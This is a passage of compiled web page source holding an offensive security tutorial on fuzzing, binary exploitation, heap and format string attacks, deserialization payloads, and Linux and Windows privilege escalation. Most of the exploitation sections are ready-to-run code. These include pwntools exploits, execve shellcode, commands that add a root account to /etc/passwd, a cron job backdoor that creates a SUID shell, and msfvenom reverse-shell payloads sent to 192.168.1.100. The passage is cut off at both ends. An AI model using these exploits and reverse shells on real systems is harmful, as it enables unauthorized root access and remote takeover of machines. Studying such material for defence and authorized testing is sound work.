format\nkeyword_obj="obj"\nkeyword_endobj="endobj"\nkeyword_stream="stream"\nkeyword_endstream="endstream"\nkeyword_PDF="%PDF-"\nmagic_header="%PDF-1.4"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Analyze results:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Check fuzzer status\n# Key metrics:\n# - execs/s: Executions per second (higher = better)\n# - unique crashes: Number of unique crash signatures\n# - unique hangs: Number of unique timeouts\n\n# Reproduce crash\n./target_fuzz findings/crashes/id:000000,sig:11,src:000000,op:havoc,rep:16\n\n# Triage crashes\nafl-collect -r -d findings/crashes/ crash_analysis/\n\n# Minimize crash input\nafl-tmin -i findings/crashes/id:000000 -o minimal_crash -- ./target_fuzz @@\n\n# Symbolically link unique crashes\nafl-whatsup findings/\n"})}),"\n",(0,r.jsx)(n.h3,{id:"libfuzzer-llvm",children:"LibFuzzer (LLVM)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Compile with LibFuzzer:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Create fuzzing harness\ncat > fuzz_target.c << 'EOF'\n#include <stdint.h>\n#include <stddef.h>\n\n// Fuzzing entry point\nint LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Call target function with fuzzer-provided data\n    if (size > 0) {\n        process_input(data, size);\n    }\n    return 0;\n}\nEOF\n\n# Compile with clang\nclang -g -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c target.c\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Run fuzzer:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Basic fuzzing\n./fuzz_target corpus/\n\n# With options\n./fuzz_target corpus/ -max_len=4096 -timeout=1 -rss_limit_mb=2048\n\n# Merge corpora\n./fuzz_target -merge=1 merged_corpus/ corpus1/ corpus2/\n\n# Minimize corpus\n./fuzz_target -merge=1 minimized_corpus/ full_corpus/\n"})}),"\n",(0,r.jsx)(n.h3,{id:"honggfuzz",children:"Honggfuzz"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install\nsudo apt install honggfuzz\n\n# Run fuzzer\nhonggfuzz -i input_corpus/ -o output_dir/ -- ./target_binary ___FILE___\n\n# With persistent mode (faster)\nhonggfuzz -i input_corpus/ -P -- ./target_binary\n"})}),"\n",(0,r.jsx)(n.h3,{id:"network-protocol-fuzzing",children:"Network Protocol Fuzzing"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Boofuzz framework:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from boofuzz import *\n\n# Define session\nsession = Session(target=Target(connection=SocketConnection("192.168.1.100", 8080)))\n\n# Define protocol\ns_initialize("HTTP Request")\ns_string("GET", fuzzable=False)\ns_delim(" ", fuzzable=False)\ns_string("/index.html")  # Fuzzable field\ns_delim(" ", fuzzable=False)\ns_string("HTTP/1.1", fuzzable=False)\ns_delim("\\r\\n", fuzzable=False)\ns_string("Host:")\ns_delim(" ", fuzzable=False)\ns_string("localhost")\ns_static("\\r\\n\\r\\n")\n\n# Start fuzzing\nsession.connect(s_get("HTTP Request"))\nsession.fuzz()\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Radamsa (mutation-based fuzzer):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install\nsudo apt install radamsa\n\n# Generate mutated inputs\ncat valid_input.bin | radamsa -n 1000 -o output_%n.bin\n\n# Fuzz in loop\nwhile true; do\n    radamsa input.txt > fuzzed.txt\n    ./target_binary fuzzed.txt\ndone\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"binary-exploitation",children:"Binary Exploitation"}),"\n",(0,r.jsx)(n.h3,{id:"crash-analysis",children:"Crash Analysis"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Analyzing crashes with GDB:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Run program in GDB\ngdb ./vulnerable_binary\n\n# Set breakpoints\n(gdb) break main\n(gdb) break vulnerable_function\n\n# Run with input\n(gdb) run $(python3 -c 'print(\"A\"*200)')\n\n# After crash, examine registers\n(gdb) info registers\n# Look for:\n# RIP/EIP = 0x4141414141414141  (overwritten instruction pointer)\n\n# Examine stack\n(gdb) x/100x $rsp\n(gdb) x/100x $rbp\n\n# Backtrace\n(gdb) bt\n\n# Examine memory at address\n(gdb) x/s 0x7fffffffe000\n\n# Find offset to EIP/RIP\n(gdb) pattern create 200\n(gdb) run [pattern]\n# After crash:\n(gdb) pattern offset $rip\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"GEF (GDB Enhanced Features):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Install GEF\nbash -c "$(curl -fsSL https://gef.blah.cat/sh)"\n\n# Launch GDB with GEF\ngdb -q ./binary\n\n# GEF commands\ngef> checksec          # Check binary protections\ngef> vmmap             # Memory mappings\ngef> search-pattern "AAAA"\ngef> ropper            # ROP gadget search\ngef> heap chunks      # Heap analysis\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Core dump analysis:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Enable core dumps\nulimit -c unlimited\n\n# Run program (will create core dump on crash)\n./vulnerable_binary $(python3 -c 'print(\"A\"*200)')\n\n# Analyze core dump\ngdb ./vulnerable_binary core\n\n# Examine crash state\n(gdb) bt\n(gdb) info registers\n(gdb) x/100x $rsp\n"})}),"\n",(0,r.jsx)(n.h3,{id:"determining-exploitability",children:"Determining Exploitability"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"EXPLOITABLE GDB plugin:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Install\ngit clone https://github.com/jfoote/exploitable.git\necho "source ~/exploitable/exploitable/exploitable.py" >> ~/.gdbinit\n\n# Use in GDB\ngdb ./binary\n(gdb) run $(python3 -c \'print("A"*200)\')\n(gdb) exploitable\n\n# Output:\n# Description: Access violation during branch instruction\n# Exploitability: EXPLOITABLE\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Manual exploitability assessment:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"1. Control of EIP/RIP?\n   - Can you redirect execution?\n   - YES \u2192 Highly exploitable\n\n2. Control of data written?\n   - Can you control what is written where?\n   - YES (write-what-where) \u2192 Exploitable\n\n3. Information leak?\n   - Can you leak addresses (bypass ASLR)?\n   - Can you leak stack canary?\n\n4. Heap corruption?\n   - Use-after-free?\n   - Double-free?\n   - Heap overflow?\n\n5. Available gadgets?\n   - ROP gadgets for exploitation?\n   - System calls available?\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"memory-corruption-vulnerabilities",children:"Memory Corruption Vulnerabilities"}),"\n",(0,r.jsx)(n.h3,{id:"buffer-overflow",children:"Buffer Overflow"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Stack buffer overflow:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'// Vulnerable code\nvoid vulnerable_function(char *user_input) {\n    char buffer[64];\n    strcpy(buffer, user_input);  // No bounds checking\n    printf("Input: %s\\n", buffer);\n}\n\nint main(int argc, char **argv) {\n    if (argc > 1) {\n        vulnerable_function(argv[1]);\n    }\n    return 0;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\n# Find offset to return address\noffset = 72  # Determined via pattern_create/pattern_offset\n\n# Craft exploit\npayload = b"A" * offset          # Fill buffer + saved RBP\npayload += p64(0x401234)         # Overwrite return address\n\n# Send payload\np = process("./vulnerable_binary")\np.sendline(payload)\np.interactive()\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Finding offset with pwntools:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\n# Generate cyclic pattern\npattern = cyclic(200)\n\n# Run program\np = process("./vulnerable_binary")\np.sendline(pattern)\np.wait()\n\n# Get core dump\ncore = p.corefile\n\n# Find offset\noffset = cyclic_find(core.read(core.rsp, 8))\nprint(f"Offset: {offset}")\n'})}),"\n",(0,r.jsx)(n.h3,{id:"heap-exploitation",children:"Heap Exploitation"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Use-After-Free (UAF):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'// Vulnerable code\nstruct User {\n    char name[32];\n    void (*print_user)(struct User *);\n};\n\nvoid print_user_info(struct User *u) {\n    printf("User: %s\\n", u->name);\n}\n\nstruct User *user = malloc(sizeof(struct User));\nuser->print_user = print_user_info;\nstrcpy(user->name, "Alice");\n\nfree(user);  // Free user object\n\n// Later... (user pointer still used)\nuser->print_user(user);  // Use-after-free! Function pointer may be attacker-controlled\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation strategy:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# 1. Trigger allocation of object\ncreate_user("Alice")\n\n# 2. Free object\ndelete_user(0)\n\n# 3. Allocate attacker-controlled data in same location\n# (spray heap with controlled data)\nfor i in range(100):\n    create_note(p64(system_address) + b"/bin/sh\\x00")\n\n# 4. Trigger use of freed object\nview_user(0)  # Calls function pointer \u2192 system("/bin/sh")\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Heap overflow:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"// Vulnerable code\nstruct Chunk {\n    size_t size;\n    char data[128];\n    struct Chunk *next;\n};\n\nvoid process_data(struct Chunk *chunk, char *user_input, size_t len) {\n    memcpy(chunk->data, user_input, len);  // No bounds check on len!\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation (overwrite next pointer):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# Overflow to overwrite 'next' pointer\npayload = b\"A\" * 128           # Fill data field\npayload += p64(0x123)          # Overwrite size\npayload += p64(target_address)  # Overwrite next pointer\n\n# When next chunk is processed, writes to target_address\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Double-free:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"// Vulnerable code\nfree(ptr);\nfree(ptr);  // Double-free!\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# Double-free allows heap metadata corruption\n# Can lead to:\n# - Arbitrary write primitive\n# - Overlapping chunks\n# - Code execution\n"})}),"\n",(0,r.jsx)(n.h3,{id:"format-string-vulnerability",children:"Format String Vulnerability"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable code:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"void vulnerable(char *user_input) {\n    printf(user_input);  // User controls format string!\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Information leak:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# Leak stack values\npayload = b"%x " * 20  # Dump 20 stack values\n\n# Leak specific address\npayload = b"%7$s" + p64(address)  # Read string at \'address\'\n\n# Leak program base (bypass PIE)\npayload = b"%13$p"  # Leak return address from stack\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Arbitrary write:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# Write to arbitrary address using %n\n# %n writes number of bytes printed so far to address\n\ntarget_address = 0x601234\nvalue_to_write = 0x1234\n\npayload = p64(target_address)           # Address to write to\npayload += b"%{}x".format(value_to_write - 8).encode()  # Print correct number of bytes\npayload += b"%7$n"                      # Write to 7th stack argument (our address)\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\n# Overwrite GOT entry to redirect execution\ngot_address = 0x601018  # printf@GOT\nsystem_address = 0x7ffff7a52390\n\npayload = p64(got_address)\npayload += b"%{}x".format((system_address & 0xFFFF) - 8).encode()\npayload += b"%7$hn"  # Write lower 2 bytes\n\np = process("./vulnerable_binary")\np.sendline(payload)\np.interactive()\n'})}),"\n",(0,r.jsx)(n.h3,{id:"integer-overflow",children:"Integer Overflow"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable code:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"void process_image(int width, int height, char *image_data) {\n    int size = width * height;  // Integer overflow!\n\n    if (size < 0) {\n        return;  // Insufficient check\n    }\n\n    char *buffer = malloc(size);\n    memcpy(buffer, image_data, size);  // Heap overflow\n}\n\n// Exploit: width=0x10000, height=0x10000\n// size = 0x100000000 (wraps to 0 in 32-bit)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Detection patterns:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"// Unsafe arithmetic\nint total = user_value1 + user_value2;  // Can overflow\nint size = count * sizeof(struct);      // Can overflow\n\n// Safe version\nif (user_value1 > INT_MAX - user_value2) {\n    // Overflow would occur\n    return -1;\n}\n\n// Or use compiler builtins\nint result;\nif (__builtin_add_overflow(a, b, &result)) {\n    // Overflow occurred\n}\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"logic-vulnerabilities",children:"Logic Vulnerabilities"}),"\n",(0,r.jsx)(n.h3,{id:"authentication-bypass",children:"Authentication Bypass"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common patterns:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# SQL injection in authentication\nusername = \"admin' --\"\npassword = \"anything\"\nquery = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n# Result: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'\n# Password check is commented out!\n\n# Boolean logic error\ndef check_password(username, password):\n    user = db.query(f\"SELECT * FROM users WHERE username='{username}'\")\n    if user and password:  # \u274c Should check password == user.password\n        return True\n    return False\n\n# Timing attack on comparison\ndef verify_token(provided_token):\n    expected_token = get_secret_token()\n    for i in range(len(expected_token)):\n        if provided_token[i] != expected_token[i]:\n            return False  # Returns early \u2192 timing leak\n    return True\n"})}),"\n",(0,r.jsx)(n.h3,{id:"business-logic-flaws",children:"Business Logic Flaws"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Price manipulation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# Vulnerable checkout process\ndef checkout(cart_items):\n    total = 0\n    for item in cart_items:\n        total += item['price'] * item['quantity']  # Client-provided price!\n    charge_customer(total)\n\n# Exploit: Set price to negative value\ncart = [\n    {'item_id': 123, 'price': -100.00, 'quantity': 1},\n    {'item_id': 456, 'price': 50.00, 'quantity': 1}\n]\n# Total: -100 + 50 = -50 (customer gets paid!)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Race condition in balance check:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# Vulnerable transfer function\ndef transfer(from_account, to_account, amount):\n    if get_balance(from_account) >= amount:  # Check\n        # Race window here!\n        deduct_balance(from_account, amount)  # Use\n        add_balance(to_account, amount)\n    else:\n        raise InsufficientFunds\n\n# Exploit: Send multiple concurrent transfer requests\n# Both pass balance check before first deduction\n"})}),"\n",(0,r.jsx)(n.h3,{id:"insecure-deserialization",children:"Insecure Deserialization"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Python pickle vulnerability:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"import pickle\nimport os\n\n# Malicious payload\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('whoami',))\n\n# Serialize\npayload = pickle.dumps(Exploit())\n\n# Vulnerable code\npickle.loads(payload)  # Executes os.system('whoami')!\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"PHP unserialize vulnerability:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\nclass User {\n    public $isAdmin = false;\n\n    public function __wakeup() {\n        if ($this->isAdmin) {\n            include('/flag.txt');\n        }\n    }\n}\n\n// Vulnerable code\n$user = unserialize($_GET['data']);\n\n// Exploit: ?data=O:4:\"User\":1:{s:7:\"isAdmin\";b:1;}\n?>\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"race-conditions",children:"Race Conditions"}),"\n",(0,r.jsx)(n.h3,{id:"toctou-time-of-check-to-time-of-use",children:"TOCTOU (Time-of-Check to Time-of-Use)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable code:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'// Check if file exists and is writable\nif (access("/tmp/myfile", W_OK) == 0) {  // Time-of-Check\n    // Attacker can replace /tmp/myfile with symlink to /etc/passwd here!\n    FILE *f = fopen("/tmp/myfile", "w");  // Time-of-Use\n    fprintf(f, "data");\n    fclose(f);\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"#!/bin/bash\n# Create race condition exploit\n\n# In one terminal: Run vulnerable program repeatedly\nwhile true; do\n    ./vulnerable_program\ndone\n\n# In another terminal: Replace file with symlink rapidly\nwhile true; do\n    rm -f /tmp/myfile\n    touch /tmp/myfile\n    rm -f /tmp/myfile\n    ln -s /etc/passwd /tmp/myfile\ndone\n\n# Eventually vulnerable program will open /etc/passwd for writing\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"File system race conditions:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'// Vulnerable: Check then create\nif (stat("/tmp/logfile", &st) == -1) {  // Check if doesn\'t exist\n    // Race window\n    FILE *f = fopen("/tmp/logfile", "w");  // Create\n}\n\n// Secure: Open with O_CREAT | O_EXCL\nint fd = open("/tmp/logfile", O_CREAT | O_EXCL | O_WRONLY, 0600);\nif (fd == -1) {\n    // File already exists\n}\n'})}),"\n",(0,r.jsx)(n.h3,{id:"multi-threaded-race-conditions",children:"Multi-threaded Race Conditions"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable code:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"int balance = 1000;\n\nvoid withdraw(int amount) {\n    if (balance >= amount) {  // Thread 1 checks\n        // Thread 2 can also check here\n        usleep(100);  // Simulate processing\n        balance -= amount;  // Both threads withdraw\n    }\n}\n\n// Two threads call withdraw(800) concurrently\n// Both pass check, balance becomes -600!\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"import threading\n\ndef exploit():\n    # Send multiple withdrawal requests concurrently\n    threads = []\n    for i in range(10):\n        t = threading.Thread(target=lambda: withdraw(800))\n        threads.append(t)\n        t.start()\n\n    for t in threads:\n        t.join()\n\n    # Balance is now negative (double-spending)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Detection with ThreadSanitizer:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Compile with TSan\nclang -fsanitize=thread -g -o program program.c\n\n# Run\n./program\n\n# Output will show race conditions:\n# WARNING: ThreadSanitizer: data race\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege Escalation"}),"\n",(0,r.jsx)(n.h3,{id:"linux-privilege-escalation",children:"Linux Privilege Escalation"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"SUID binary exploitation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Find SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Common exploitable SUID binaries:\n# - Custom binaries with vulnerabilities\n# - Misconfigured system utilities\n\n# Example: SUID binary with buffer overflow\n/usr/local/bin/custom_tool $(python3 -c 'print(\"A\"*200 + shellcode)')\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Kernel exploits:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Check kernel version\nuname -a\n\n# Search for kernel exploits\nsearchsploit linux kernel 4.4.0\n\n# Common kernel exploits:\n# - Dirty COW (CVE-2016-5195)\n# - DirtyCred (CVE-2022-0847)\n# - PwnKit (CVE-2021-4034)\n\n# Example: Dirty COW exploitation\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty password\n# Overwrites /etc/passwd to add root user\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Sudo misconfigurations:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Check sudo privileges\nsudo -l\n\n# Exploitable patterns:\n# (ALL) NOPASSWD: /usr/bin/vim\nsudo vim -c ':!/bin/sh'\n\n# (ALL) NOPASSWD: /usr/bin/find\nsudo find . -exec /bin/sh \\; -quit\n\n# (ALL) NOPASSWD: /usr/bin/python\nsudo python -c 'import os; os.system(\"/bin/sh\")'\n\n# GTFOBins for sudo escape techniques:\n# https://gtfobins.github.io/\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Writable /etc/passwd:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Check if /etc/passwd is writable\nls -la /etc/passwd\n\n# If writable, add root user\nopenssl passwd -1 -salt salt password123\necho 'hacker:$1$salt$qMKkPP7L3pKrLwBJgmGVH.:0:0::/root:/bin/bash' >> /etc/passwd\n\n# Login as root\nsu hacker\n# Password: password123\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Cron job abuse:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Check for writable cron jobs\nls -la /etc/cron.d/\nls -la /etc/cron.daily/\ncat /etc/crontab\n\n# If script run by root is writable\necho '#!/bin/bash' > /usr/local/bin/backup.sh\necho 'cp /bin/bash /tmp/rootbash' >> /usr/local/bin/backup.sh\necho 'chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh\nchmod +x /usr/local/bin/backup.sh\n\n# Wait for cron to execute\n# Then:\n/tmp/rootbash -p\n"})}),"\n",(0,r.jsx)(n.h3,{id:"windows-privilege-escalation",children:"Windows Privilege Escalation"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common vectors:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'# Unquoted service paths\nwmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """\n\n# Exploitable if path contains spaces:\n# C:\\Program Files\\My Service\\service.exe\n# Windows tries: C:\\Program.exe, C:\\Program Files\\My.exe\n\n# AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# If both are 1, can install MSI as SYSTEM\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o shell.msi\nmsiexec /quiet /qn /i shell.msi\n\n# Weak service permissions\naccesschk.exe /accepteula -uwcqv "Authenticated Users" *\n\n# If service binary is writable, replace with malicious binary\nsc stop vulnerable_service\nmove C:\\Path\\To\\service.exe C:\\Path\\To\\service.exe.bak\ncopy payload.exe C:\\Path\\To\\service.exe\nsc start vulnerable_service\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Token impersonation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# Check for SeImpersonatePrivilege\nwhoami /priv\n\n# If enabled, use JuicyPotato/RoguePotato\nJuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t * -c {CLSID}\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"exploit-development",children:"Exploit Development"}),"\n",(0,r.jsx)(n.h3,{id:"shellcode-development",children:"Shellcode Development"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:'Linux x64 execve("/bin/sh") shellcode:'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-nasm",children:'; execve("/bin/sh", NULL, NULL)\nglobal _start\nsection .text\n\n_start:\n    xor rax, rax\n    push rax              ; NULL terminator\n    mov rbx, 0x68732f6e69622f  ; "/bin/sh" in reverse\n    push rbx\n    mov rdi, rsp          ; rdi = pointer to "/bin/sh"\n    push rax              ; argv[1] = NULL\n    push rdi              ; argv[0] = "/bin/sh"\n    mov rsi, rsp          ; rsi = argv\n    xor rdx, rdx          ; rdx = NULL (envp)\n    mov al, 59            ; syscall number for execve\n    syscall\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Assemble and extract shellcode:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Assemble\nnasm -f elf64 shellcode.asm -o shellcode.o\n\n# Link\nld shellcode.o -o shellcode\n\n# Extract shellcode bytes\nobjdump -d shellcode -M intel\n\n# Or use objcopy\nobjcopy -O binary shellcode shellcode.bin\nxxd -p shellcode.bin | tr -d '\\n'\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Test shellcode:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n#include <string.h>\n\nunsigned char shellcode[] = "\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05";\n\nint main() {\n    printf("Shellcode length: %lu\\n", strlen(shellcode));\n\n    int (*ret)() = (int(*)())shellcode;\n    ret();\n\n    return 0;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Compile and run:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Disable protections for testing\ngcc -z execstack -fno-stack-protector -o test_shellcode test_shellcode.c\n\n./test_shellcode\n# Should spawn shell\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Msfvenom shellcode generation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Linux x64 reverse shell\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c\n\n# Windows x64 reverse shell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c\n\n# Encode shellcode (bypass bad characters)\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\\x00\\x0a\\x0d' -f c\n\n# Bind shell\nmsfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f c\n"})}),"\n",(0,r.jsx)(n.h3,{id:"rop-return-oriented-programming",children:"ROP (Return-Oriented Programming)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Finding ROP gadgets:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# 